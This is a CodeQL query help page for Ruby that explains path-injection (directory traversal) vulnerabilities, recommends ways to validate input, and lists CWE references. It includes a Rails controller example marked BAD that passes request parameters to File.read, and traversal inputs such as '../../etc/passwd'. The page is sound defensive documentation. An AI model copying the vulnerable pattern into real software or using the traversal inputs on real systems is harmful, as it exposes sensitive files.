  + [Unsafe code constructed from library input](../rb-unsafe-code-construction/)
  + [Unsafe shell command constructed from library input](../rb-shell-command-constructed-from-input/)
  + [Use of `Kernel.open` or `IO.read` or similar sinks with a non-constant value](../rb-non-constant-kernel-open/)
  + [Use of `Kernel.open`, `IO.read` or similar sinks with user-controlled input](../rb-kernel-open/)
  + [Use of a broken or weak cryptographic algorithm](../rb-weak-cryptographic-algorithm/)
  + [Use of a broken or weak cryptographic hashing algorithm on sensitive data](../rb-weak-sensitive-data-hashing/)
  + [Use of externally-controlled format string](../rb-tainted-format-string/)
  + [Weak cookie configuration](../rb-weak-cookie-configuration/)
  + [XML external entity expansion](../rb-xxe/)
* [CodeQL query help for Swift](../../swift/)
* [CodeQL CWE coverage](../../codeql-cwe-coverage/)

* [CodeQL query help documentation](../../) »
* [CodeQL query help for Ruby](../) »

# Uncontrolled data used in path expression[¶](#uncontrolled-data-used-in-path-expression "Link to this heading")

```
ID: rb/path-injection
Kind: path-problem
Security severity: 7.5
Severity: error
Precision: high
Tags:
   - security
   - external/cwe/cwe-022
   - external/cwe/cwe-023
   - external/cwe/cwe-036
   - external/cwe/cwe-073
   - external/cwe/cwe-099
Query suites:
   - ruby-code-scanning.qls
   - ruby-security-extended.qls
   - ruby-security-and-quality.qls

```

[Click to see the query in the CodeQL repository](https://github.com/github/codeql/blob/main/ruby/ql/src/queries/security/cwe-022/PathInjection.ql)

Accessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.

## Recommendation[¶](#recommendation "Link to this heading")

Validate user input before using it to construct a file path, either using an off-the-shelf library like `ActiveStorage::Filename#sanitized` in Rails, or by performing custom validation.

Ideally, follow these rules:

* Do not allow more than a single “.” character.
* Do not allow directory separators such as “/” or “\” (depending on the file system).
* Do not rely on simply replacing problematic sequences such as “../”. For example, after applying this filter to “…/…//”, the resulting string would still be “../”.
* Use a whitelist of known good patterns.

## Example[¶](#example "Link to this heading")

In the first example, a file name is read from an HTTP request and then used to access a file. However, a malicious user could enter a file name which is an absolute path, such as `"/etc/passwd"`.

In the second example, it appears that the user is restricted to opening a file within the `"user"` home directory. However, a malicious user could enter a file name containing special characters. For example, the string `"../../etc/passwd"` will result in the code reading the file located at `"/home/user/../../etc/passwd"`, which is the system’s password file. This file would then be sent back to the user, giving them access to all the system’s passwords.

```
class FilesController < ActionController::Base
  def first_example
    # BAD: This could read any file on the file system
    @content = File.read params[:path]
  end

  def second_example
    # BAD: This could still read any file on the file system
    @content = File.read "/home/user/#{ params[:path] }"
  end
end

```

## References[¶](#references "Link to this heading")

* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
* Rails: [ActiveStorage::Filename#sanitized](https://api.rubyonrails.org/classes/ActiveStorage/Filename.html#method-i-sanitized).
* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).
* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).
* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).

* ©
   GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)


